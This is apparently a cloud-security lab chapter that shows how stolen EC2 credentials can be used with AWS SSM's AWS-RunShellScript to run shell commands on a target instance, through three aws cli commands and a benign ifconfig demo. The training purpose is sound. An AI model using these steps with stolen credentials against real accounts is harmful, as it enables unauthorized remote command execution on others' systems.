# Execute commands using SSM

## Introduction

When you discover a vulnerability that allows you to gain access to the security credentials on an EC2 (from the environment variables or instance meta-data), using SSM you can use this to execute commands on the machine.

AWS SSM uses various 'documents' to operationalize AWS resources. The full list of documents can be found at `https://console.aws.amazon.com/systems-manager/documents/`

Using the `AWS-RunShellScript` document, we can execute commands on the target EC2.

## What are we going to cover?

This chapter will cover the aws cli commands required to execute on commands on a target EC2. Although, we will be attacking the attacker machine, this can easily be reproduced on another machine by creating profile of the stolen credentials.

## Steps to achieve this

- In your student machine, run

`aws ssm describe-instance-information` 

to obtain the instance-id of the EC2 to which the SSM policy is attached.

- Run 

`aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP config" --parameters commands=ifconfig --output text --query "Command.CommandId"`

to execute `ifconfig` and obtain its `CommandId` which is required to see the output of the command

- Run

`aws ssm list-command-invocations --command-id "COMMAND-ID-HERE" --details --query "CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}"`

to see the output.

## Additional references

- [AWS-RunShellScript Example](https://docs.aws.amazon.com/systems-manager/latest/userguide/walkthrough-cli.html)
- [AWS SSM Documents](https://console.aws.amazon.com/systems-manager/documents/)
- [IAM, SSM and Code Execution](https://speakerdeck.com/riyazwalikar/raining-shells-in-aws-by-chaining-vulnerabilities?slide=33)